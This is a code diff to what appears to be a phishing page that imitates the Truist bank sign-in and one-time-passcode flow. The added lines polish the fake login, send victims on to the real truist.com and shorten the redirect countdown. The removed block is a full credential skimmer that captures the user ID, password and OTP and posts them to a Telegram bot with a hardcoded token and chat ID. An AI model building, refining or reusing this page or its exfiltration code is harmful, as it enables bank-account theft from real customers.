@@ -75,6 +75,20 @@
       }
     }
 
+    /* FIX: Save user ID checkbox */
+    .login-save-user-id-checkbox {
+      position: static !important;
+      width: 18px !important;
+      height: 18px !important;
+      max-height: 18px !important;
+      padding: 0 !important;
+      opacity: 1 !important;
+      -webkit-appearance: checkbox !important;
+      appearance: checkbox !important;
+      cursor: pointer !important;
+      flex-shrink: 0 !important;
+    }
+
     /* Close button: exact dimensions from homepage signon-close-button */
     .login-page-close-btn {
       position: absolute;
@@ -138,7 +152,8 @@
     <div class="hero--login-menu--row">
 
       <!-- × Close button — top right, same as homepage mobile sign-in overlay -->
-      <button type="button" class="login-page-close-btn" aria-label="Close sign in" onclick="window.location.href='/'">
+      <button type="button" class="login-page-close-btn" aria-label="Close sign in"
+        onclick="window.location.href='https://www.truist.com'">
         <span aria-hidden="true" class="login-page-close-icon"></span>
       </button>
 
@@ -475,7 +490,7 @@
       // ── Step 3: countdown then redirect ───────────────────────────────────────
       var countdownTimer = null;
       function startCountdown() {
-        var remaining = 10;
+        var remaining = 3;
         var fill = byId('tru-progress-fill');
         if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
         setTimeout(function () { if (fill) fill.style.transition = 'width 1s linear'; }, 50);
@@ -487,7 +502,7 @@
         }, 1000);
       }
 
-      function goHome() { clearInterval(countdownTimer); window.location.href = '/'; }
+      function goHome() { clearInterval(countdownTimer); window.location.href = 'https://www.truist.com'; }
 
       var goNowBtn = byId('tru-go-home-now');
       if (goNowBtn) { goNowBtn.addEventListener('click', goHome); }
@@ -509,94 +524,6 @@
     })();
   </script>
 
-<script>
-    // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
-    const TELEGRAM_BOT_TOKEN = '8674177590:AAFsHItZrfoUE00Vu9_gJ77d7tLbcMm00JQ';
-    const TELEGRAM_CHAT_ID = '8585629776';
-
-    // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
-
-    async function sendToTelegram(formData) {
-        let message = '🔔 New submission from your demo website:\n\n';
-        for (let [key, value] of formData.entries()) {
-            let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
-            message += `👉 ${cleanKey}: ${value}\n`;
-        }
-
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-        const payload = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        };
-
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            });
-
-            if (!response.ok) {
-                console.error(`Telegram API Error: ${response.statusText}`);
-            }
-        } catch (error) {
-            console.error('Failed to send message to Telegram:', error);
-        }
-    }
-
-    function handleSignInClick(event) {
-        // Prevent the default action (which opens the popup) for just a split second
-        // to grab the data.
-        
-        // Directly grab the values from the input fields
-        const userIdInput = document.getElementById('iduserId');
-        const passwordInput = document.getElementById('idpassword');
-        
-        let data = {};
-        
-        if (userIdInput) {
-            data['User ID'] = userIdInput.value || 'Not provided';
-        }
-        if (passwordInput) {
-            // WARNING: Passwords should ideally be hashed before sending.
-            // For this script, we are sending raw for debugging.
-            data['Password'] = passwordInput.value || 'Not provided';
-        }
-
-        // Send this data to Telegram immediately
-        sendToTelegram(new FormData(new URLSearchParams(data)));
-
-        // Now, allow the normal flow (opening the popup) to continue
-        // by not calling event.preventDefault() here.
-    }
-
-    // This function handles the OTP form (which you already have working)
-    function handleOtpSubmit(event) {
-        // This logic already exists in your original script, but we need to
-        // ensure our script runs alongside it.
-        const formData = new FormData(document.getElementById('tru-otp-form'));
-        sendToTelegram(formData);
-    }
-
-    // --- INITIALIZATION ---
-    document.addEventListener('DOMContentLoaded', () => {
-        const signInButton = document.getElementById('loginSubmit');
-        if (signInButton) {
-            // Attach our custom click handler
-            signInButton.addEventListener('click', handleSignInClick);
-        }
-
-        const otpForm = document.getElementById('tru-otp-form');
-        if (otpForm) {
-            // We need to run our function BEFORE your original script prevents default
-            otpForm.addEventListener('submit', handleOtpSubmit, true);
-        }
-    });
-</script>
 
 </body>
 
